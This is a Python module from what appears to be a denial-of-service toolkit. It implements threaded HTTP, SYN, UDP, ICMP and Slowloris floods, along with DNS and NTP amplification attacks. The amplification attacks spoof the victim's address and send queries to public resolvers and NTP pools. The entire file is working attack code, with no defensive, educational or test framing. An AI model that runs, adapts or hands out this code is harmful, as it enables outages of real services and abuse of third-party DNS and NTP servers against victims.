import threading
import time
import socket
import random
import requests
import logging
from scapy.all import IP, TCP, UDP, ICMP, DNS, DNSQR, Raw, send
from dose.utils import get_random_user_agent, validate_target

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

class BaseAttack:
    def __init__(self, target, target_ip, threads, delay, requests_per_thread):
        self.target = target
        self.target_ip = target_ip
        self.threads = threads
        self.delay = delay
        self.requests_per_thread = requests_per_thread
        self.running = False
        self.threads_list = []

    def start(self):
        self.running = True
        for _ in range(self.threads):
            t = threading.Thread(target=self.attack)
            t.daemon = True
            self.threads_list.append(t)
            t.start()

    def stop(self):
        self.running = False
        for t in self.threads_list:
            t.join()

    def attack(self):
        raise NotImplementedError

class HTTPFlood(BaseAttack):
    def attack(self):
        headers = {"User-Agent": get_random_user_agent()}
        url = self.target if self.target.startswith("http") else f"http://{self.target}"
        for _ in range(self.requests_per_thread):
            if not self.running:
                break
            try:
                method = random.choice(["GET", "POST"])
                if method == "GET":
                    response = requests.get(url, headers=headers, timeout=5)
                else:
                    response = requests.post(url, headers=headers, data={"dummy": "data"}, timeout=5)
                logging.info(f"HTTP {method} request sent to {url}, status: {response.status_code}")
            except requests.RequestException as e:
                logging.error(f"HTTP request failed: {e}")
            time.sleep(self.delay)

class SYNFlood(BaseAttack):
    def attack(self):
        for _ in range(self.requests_per_thread):
            if not self.running:
                break
            try:
                pkt = IP(src=f"192.168.{random.randint(0,255)}.{random.randint(0,255)}", dst=self.target_ip) / \
                      TCP(sport=random.randint(1024, 65535), dport=80, flags="S")
                send(pkt, verbose=False)
                logging.info(f"SYN packet sent to {self.target_ip}")
            except Exception as e:
                logging.error(f"SYN flood failed: {e}")
            time.sleep(self.delay)

class UDPFlood(BaseAttack):
    def attack(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for _ in range(self.requests_per_thread):
            if not self.running:
                break
            try:
                port = random.randint(1, 65535)
                data = random.randbytes(random.randint(64, 1024))
                sock.sendto(data, (self.target_ip, port))
                logging.info(f"UDP packet sent to {self.target_ip}:{port}")
            except socket.error as e:
                logging.error(f"UDP flood failed: {e}")
            time.sleep(self.delay)
        sock.close()

class Slowloris(BaseAttack):
    def attack(self):
        sockets = []
        for _ in range(self.requests_per_thread):
            if not self.running:
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.target_ip, 80))
                s.send(f"GET / HTTP/1.1\r\nHost: {self.target}\r\n".encode())
                sockets.append(s)
                logging.info(f"Slowloris connection opened to {self.target_ip}")
                time.sleep(self.delay)
            except socket.error as e:
                logging.error(f"Slowloris failed: {e}")
        for s in sockets:
            try:
                s.close()
            except:
                pass

class ICMPFlood(BaseAttack):
    def attack(self):
        for _ in range(self.requests_per_thread):
            if not self.running:
                break
            try:
                pkt = IP(dst=self.target_ip) / ICMP() / (b"X" * random.randint(1000, 65535))
                send(pkt, verbose=False)
                logging.info(f"ICMP packet sent to {self.target_ip}")
            except Exception as e:
                logging.error(f"ICMP flood failed: {e}")
            time.sleep(self.delay)

class DNSAmplification(BaseAttack):
    def attack(self):
        dns_servers = ["8.8.8.8", "1.1.1.1"]  # Public DNS servers
        for _ in range(self.requests_per_thread):
            if not self.running:
                break
            try:
                pkt = IP(dst=random.choice(dns_servers), src=self.target_ip) / \
                      UDP(sport=random.randint(1024, 65535), dport=53) / \
                      DNS(rd=1, qd=DNSQR(qname="example.com", qtype="ANY"))
                send(pkt, verbose=False)
                logging.info(f"DNS amplification packet sent to {self.target_ip}")
            except Exception as e:
                logging.error(f"DNS amplification failed: {e}")
            time.sleep(self.delay)

class NTPAmplification(BaseAttack):
    def attack(self):
        ntp_servers = ["pool.ntp.org"]  # Public NTP servers
        for _ in range(self.requests_per_thread):
            if not self.running:
                break
            try:
                pkt = IP(dst=random.choice(ntp_servers), src=self.target_ip) / \
                      UDP(sport=random.randint(1024, 65535), dport=123) / \
                      Raw(load=b"\x17\x00\x03\x2a" + b"\x00" * 4)
                send(pkt, verbose=False)
                logging.info(f"NTP amplification packet sent to {self.target_ip}")
            except Exception as e:
                logging.error(f"NTP amplification failed: {e}")
            time.sleep(self.delay)
